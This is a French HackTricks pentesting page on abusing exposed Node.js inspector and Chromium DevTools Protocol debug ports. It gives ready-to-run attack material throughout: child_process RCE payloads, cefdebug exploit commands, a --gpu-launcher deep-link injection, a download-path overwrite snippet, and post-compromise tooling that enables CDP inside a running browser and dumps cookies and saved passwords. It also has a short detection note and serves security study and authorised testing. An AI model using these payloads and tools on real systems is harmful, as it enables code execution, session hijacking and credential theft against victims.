# Abus du débogueur Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Parmi les exemples pratiques historiques figurent le walkthrough Multimaster et l’attaque du débogueur de Visual Studio Code CVE-2019-1414 ; utilisez-les comme contexte spécifique à certaines versions, sans supposer que toutes les cibles Electron ou Chromium actuelles exposent les mêmes primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Informations de base

[Extrait de la documentation](https://nodejs.org/learn/getting-started/debugging) : lorsqu’un processus Node.js est démarré avec l’option `--inspect`, il se met à l’écoute d’un client de débogage. Par **défaut**, il écoute sur l’hôte et le port **`127.0.0.1:9229`**. Un **UUID** **unique** est également attribué à chaque processus.<sup>[[4]](#references)</sup>

Les clients Inspector doivent connaître et spécifier l’adresse de l’hôte, le port et l’UUID pour se connecter. Une URL complète ressemblera à `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Comme le **débogueur a un accès complet à l’environnement d’exécution Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d’exécuter du code arbitraire au nom du processus Node.js (**élévation potentielle de privilèges**).<sup>[[4]](#references)</sup>

Il existe plusieurs façons de démarrer un Inspector :<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Lorsque vous démarrez un processus inspecté, quelque chose comme ceci apparaîtra :<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Les processus basés sur **CEF** (**Chromium Embedded Framework**) peuvent exposer un debugger avec `--remote-debugging-port=9222`. Cela expose le navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) plutôt que via un inspecteur Node.js, les payloads basés sur `process` de Node.js ne sont donc pas directement applicables par défaut.<sup>[[2]](#references)[[5]](#references)</sup>

Lorsque vous démarrez un navigateur en mode débogage, quelque chose comme ceci apparaît :<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Énumération et pilotage d’un endpoint CDP

Les endpoints HTTP de découverte distinguent le WebSocket du **browser** des WebSockets de chaque **target** (onglet, worker, extension, etc.). Interrogez `/json/version` pour obtenir l’endpoint du browser et `/json/list` pour les targets ; vous pouvez ensuite piloter directement les valeurs `webSocketDebuggerUrl` renvoyées à l’aide des messages de type JSON-RPC de CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Par exemple, connectez-vous avec `websocat "$BROWSER_WS"` et envoyez `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Sur une cible de page (`websocat "$PAGE_WS"`), `Runtime.evaluate` s’exécute dans ce renderer et `Page.captureScreenshot` renvoie une capture d’écran encodée en base64. `document.cookie` ne peut pas révéler les cookies `HttpOnly`, tandis que `Storage.getCookies` interroge le navigateur pour obtenir son magasin de cookies.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Navigateurs, WebSockets et politique de même origine <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites web ouverts dans un navigateur peuvent effectuer des requêtes WebSocket et HTTP selon le modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session de débogueur unique**. La **politique de même origine** **empêche** les sites web d'établir **cette connexion HTTP**. Pour renforcer la sécurité contre les [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js vérifie que les **en-têtes 'Host'** de la connexion spécifient soit une **adresse IP**, soit exactement **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Cette **mesure de sécurité empêche d'exploiter l'inspecteur** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait être fait en exploitant une vuln SSRF).<sup>[[4]](#references)</sup>

### Démarrer l'inspecteur dans les processus en cours d'exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus Node.js en cours d'exécution pour lui faire **démarrer l'inspecteur** sur le port par défaut. Notez toutefois que vous devez disposer de privilèges suffisants ; cela peut donc vous donner un **accès privilégié aux informations contenues dans le processus**, mais ne constitue pas une élévation de privilèges directe.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Ceci est utile dans les conteneurs, car **arrêter le processus et en démarrer un nouveau** avec `--inspect` **n’est pas une option** : le **conteneur** sera **arrêté** en même temps que le processus.<sup>[[6]](#references)</sup>

### Se connecter à l’inspecteur/débogueur

Pour se connecter à un **navigateur basé sur Chromium**, vous pouvez accéder aux URL `chrome://inspect` ou `edge://inspect` pour Chrome ou Edge, respectivement. En cliquant sur le bouton Configure, il faut s’assurer que **l’hôte et le port cibles** sont correctement indiqués. L’image montre un exemple de Remote Code Execution (RCE) :<sup>[[2]](#references)[[4]](#references)</sup>

![Une URL permettant d’accéder au débogueur apparaîtra, par exemple ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Se connecter à l’inspecteur/débogueur : pour se connecter à un navigateur basé sur Chromium, ...](<../../images/image (674).png>)

Vous pouvez vous connecter à un débogueur/inspecteur **en ligne de commande** avec :<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

L’outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permet de **trouver les inspecteurs** exécutés localement et d’y **injecter du code**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Notez que les exploits **RCE de NodeJS ne fonctionneront pas** si vous êtes connecté à un navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez consulter l’API pour trouver des choses intéressantes à faire avec).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Si vous êtes arrivé ici en cherchant comment obtenir une [**RCE à partir d’une XSS dans Electron, veuillez consulter cette page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Voici quelques méthodes courantes pour obtenir une **RCE** lorsque vous pouvez vous **connecter** à un **inspector** Node (il semble que cela **ne fonctionnera pas avec une connexion au Chrome DevTools Protocol**) :<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Charges utiles du protocole Chrome DevTools

Vous pouvez consulter l’API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Dans cette section, je vais simplement lister des éléments intéressants que j’ai trouvé des personnes utiliser pour exploiter ce protocole.

### Restriction du profil par défaut à partir de Chrome 136

À partir de **Chrome 136**, Chrome ignore `--remote-debugging-port` et `--remote-debugging-pipe` lorsqu’ils ciblent le **répertoire de données Chrome par défaut**. Le paramètre doit être associé à un `--user-data-dir` non standard, dont la clé de chiffrement distincte et l’état isolé du navigateur empêchent cette technique simple basée sur un flag d’exposer le profil authentifié normal de l’utilisateur. Il ne faut pas supposer que cette restriction propre à Chrome s’applique aux anciennes versions de Chrome, à Chrome for Testing, aux applications Electron/CEF ou aux autres dérivés de Chromium sans vérification.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Par conséquent, voir un processus Chrome actuel lancé uniquement avec `--remote-debugging-port` ne **prouve pas que CDP est devenu actif**. Vérifiez l’écouteur et `/json/version`, et déterminez quel profil le prend réellement en charge.<sup>[[14]](#references)</sup>

### Injection de paramètres via des liens profonds

Dans [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security a découvert qu’une application basée sur CEF avait **enregistré un URI personnalisé** dans le système (workspaces://index.html), qui recevait l’URI complète, puis **lançait l’application basée sur CEF** avec une configuration partiellement construite à partir de cet URI.<sup>[[8]](#references)</sup>

Il a été découvert que les paramètres de l’URI étaient décodés depuis leur format URL et utilisés pour lancer l’application basée sur CEF, ce qui permettait à un utilisateur d’**injecter** le flag **`--gpu-launcher`** dans la **ligne de commande** et d’exécuter des commandes arbitraires.<sup>[[8]](#references)</sup>

Ainsi, un payload comme :

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Exécutera calc.exe.<sup>[[8]](#references)</sup>

### Écraser des fichiers

Modifiez le dossier où les **fichiers téléchargés seront enregistrés**, puis téléchargez un fichier pour **écraser** le **code source** fréquemment utilisé par l’application avec votre **code malveillant**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE et exfiltration via WebDriver

STAR Labs a montré que des services WebDriver/CDP exposés peuvent permettre la lecture arbitraire de fichiers et l'exécution de code à distance (RCE) ; le DNS rebinding peut compléter la chaîne d'exploitation dans certaines configurations.<sup>[[9]](#references)</sup>

Le service WebDriver de ChromeDriver est distinct de Chrome DevTools/CDP. Sa capacité [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) sélectionne l'exécutable du navigateur lancé pour une nouvelle session. Si un utilisateur non privilégié peut accéder à un service ChromeDriver exécuté en tant que root et lui soumettre une session avec un chemin d'exécutable contrôlé par l'utilisateur, ce lancement peut franchir la frontière de privilèges du service. Une réponse `/sessions` vide ne permet pas de conclure que de nouvelles sessions ne peuvent pas être créées. Avant de conclure que cette méthode est exploitable, vérifiez le propriétaire du processus, l'accessibilité réelle de son port d'écoute, l'autorisation des sessions, l'accès à l'exécutable et les mécanismes de confinement ; le nom du processus ou son port habituel ne suffisent pas. [Les recommandations de sécurité de Google](https://developer.chrome.com/docs/chromedriver/security-considerations) préconisent d'exécuter ChromeDriver avec un compte non privilégié. L'énumération passive ne doit pas créer de session WebDriver.

Pour d'autres cas historiques concernant l'automatisation des navigateurs et la sécurité de Chromium, consultez l'article de Counter WebDriver et les problèmes 773, 1742 et 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Activation de CDP dans un processus Chromium en cours d'exécution

La restriction du profil par défaut de Chrome bloque uniquement l'activation par ligne de commande. Avec un accès suffisant, sous le même utilisateur, pour manipuler le processus du navigateur, le [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) original et le [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) de Cobalt Strike invoquent la fonction non exportée de Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` au sein du processus `chrome.exe` ou `msedge.exe` déjà en cours d'exécution. Le point de terminaison est donc rattaché au profil réel, et conserve ses onglets, extensions, cookies et état d'authentification.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Pour les processus Chrome/Edge x64 classiques, le BOF repère la fenêtre du navigateur et la bibliothèque `chrome.dll`/`msedge.dll` chargée, recherche des signatures masquées dans le PE distant, alloue des stubs et un bloc de contexte, remplace temporairement la procédure de fenêtre, puis déclenche l'appel final sur le **thread UI** du navigateur. Les entrées d'exécution concernées sont `StartRemoteDebuggingServer`, l'`operator new` de Chromium, `TCPServerSocketFactory::CreateForHttpServer` et la vtable de la factory. L'exécution s'arrête si une signature obligatoire ne correspond pas à une correspondance unique.<sup>[[15]](#references)[[16]](#references)</sup>

Le BOF accepte un mode de navigateur et un port facultatif. Son script auxiliaire peut ensuite vérifier le point de terminaison et collecter les cookies ; `chrome-iso` est une méthode distincte ciblant la frontière Windows Process Isolation de Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

The chemin `chrome-iso` utilise uniquement des handles limités aux requêtes vers le processus isolé. Il identifie le `chrome.dll` installé dont la taille de l’image PE correspond à celle du processus en cours d’exécution, résout les symboles à partir de cette image locale, puis utilise le dispatch `WindowImpl` de Chromium, un `WM_COPYDATA` synchrone et un hook User32 dans une image existante pour atteindre le thread de l’interface utilisateur.<sup>[[16]](#references)</sup>

> [!WARNING]
> Il s’agit d’une technique de **manipulation du processus du navigateur après compromission**, et non d’un contournement réseau sans authentification. Elle dépend de la build, car les symboles C++ concernés ne sont pas exportés et peuvent changer après les mises à jour du navigateur.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Actualiser les signatures après les mises à jour du navigateur

Utilisez la version exacte de `chrome.dll` ou `msedge.dll` installée sur la cible et le PDB correspondant. `symchk.exe`, fourni avec le Windows SDK, télécharge les symboles ; les scripts du dépôt localisent ensuite `StartRemoteDebuggingServer`, déduisent les paramètres de l’allocateur et de la fabrique de sockets, ou valident chaque signature intégrée au BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Un résultat sans correspondance ou avec plusieurs correspondances ne doit pas être remplacé par une adresse arbitraire. Si un motif connu de `operator new` ou de `CreateForHttpServer` a trop changé pour servir de base à un nouveau masque, utilisez `pe_signature_finder.py` avec le PDB pour inspecter ce symbole et dériver une séquence d’octets unique dans le module cible.<sup>[[16]](#references)[[18]](#references)</sup>

#### Extraction depuis un navigateur authentifié avec CDP Toolkit

Cette technique ne déchiffre pas hors ligne l’App-Bound Encryption (ABE) et ne supprime pas la liaison à l’appareil. Elle considère plutôt le navigateur légitime comme un **oracle de déchiffrement et un proxy d’interaction authentifiée** : `Storage.getCookies` demande au navigateur en cours d’exécution les cookies de son magasin, tandis que les workflows de navigation et de capture d’écran maintiennent les requêtes, le stockage, l’authentification d’entreprise et les comportements liés à l’appareil dans le navigateur déjà utilisé par la victime.<sup>[[17]](#references)[[18]](#references)</sup>

Après avoir redirigé le listener CDP local via le pivot de l’opérateur, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) peut énumérer et collecter les artefacts courants.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` et `tabs screenshot` sont principalement des wrappers autour de `/json/version`, de la liste des cibles, de `Storage.getCookies` et de `Page.captureScreenshot`. L’historique, les favoris, les extensions et les métadonnées des mots de passe nécessitent plutôt une cible WebUI temporaire `chrome://`/`edge://` : le toolkit attend que l’interface s’affiche, inspecte son modèle ou son DOM, récupère le résultat, puis ferme la cible.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` va plus loin : il ouvre l’origine réelle de la connexion enregistrée, place le focus sur un champ d’identifiant, sélectionne la suggestion native de remplissage automatique à l’aide d’événements d’entrée CDP, puis lit les valeurs renseignées. L’origine, le port et le chemin doivent correspondre de très près au realm du mot de passe enregistré ; le mode visible est le choix par défaut le plus fiable, car la fenêtre de suggestion est une interface native du navigateur.<sup>[[17]](#references)[[18]](#references)</sup>

Pour une interaction en direct, `browser-takeover screencast` transmet des images et envoie des entrées à une cible réelle (y compris en mode arrière-plan ou hors écran). `browser-takeover proxy` accepte plutôt localement les requêtes HTTP et HTTPS `CONNECT`, puis effectue les requêtes vers les serveurs en amont via des cibles Chrome masquées. Si les cibles masquées ne sont pas disponibles, il utilise des onglets en arrière-plan. Cette méthode conserve le contexte réseau et d’authentification de la victime, mais elle est moins fidèle pour les applications complexes côté client, car c’est le navigateur de l’opérateur qui affiche le contenu renvoyé.<sup>[[17]](#references)[[18]](#references)</sup>

Pour la détection, ne vous fiez pas uniquement à la télémétrie des arguments de ligne de commande `--remote-debugging-*` : corrélez également les handles inhabituels et les opérations mémoire visant les processus du navigateur (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, création de threads), l’injection de DLL et les sockets d’écoute loopback inattendus appartenant à Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-exploitation

Dans un environnement réel, **après avoir compromis** un PC utilisateur équipé d’un navigateur basé sur Chromium, une technique historique consistait à relancer le navigateur avec le débogage activé et à transférer le port loopback. Cela peut exposer l’état de navigation de la victime sur les produits et builds qui acceptent encore le profil sélectionné, mais Chrome 136+ ne l’autorise pas avec son répertoire de données par défaut.<sup>[[7]](#references)[[14]](#references)</sup>

La commande de relancement d’origine est conservée ci-dessous pour les cibles anciennes ou spécifiques à certaines versions. La seconde commande correspond à la méthode prise en charge par Chrome actuel, mais crée un profil isolé au lieu de rouvrir l’état d’authentification habituel de la victime.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Pour les techniques spécifiques à macOS de relancement de Chromium, d’extension et de CDP, voir [Injection de Chromium sur macOS](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Outil d’inspection et d’exploitation du debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414 : exécution de code à distance dans Visual Studio Code via le debugger Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guide de débogage Node.js - Premiers pas](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Compte rendu de corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation : abuser de la fonctionnalité de débogage de Chrome pour observer et contrôler à distance des sessions de navigation](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112 : exécution de code à distance dans AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Tu me parles ? - RCE WebDriver via DNS Rebinding et CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contre WebDriver - Du bot à la RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Problème 773 de Google Project Zero (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Problème 1742 de Google Project Zero (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Problème 1944 de Google Project Zero (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Modifications des options de débogage à distance pour améliorer la sécurité - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injection de CDP dans un navigateur Edge en cours d’exécution : analyse approfondie de l’instrumentation du navigateur à l’exécution](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Le retour de Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
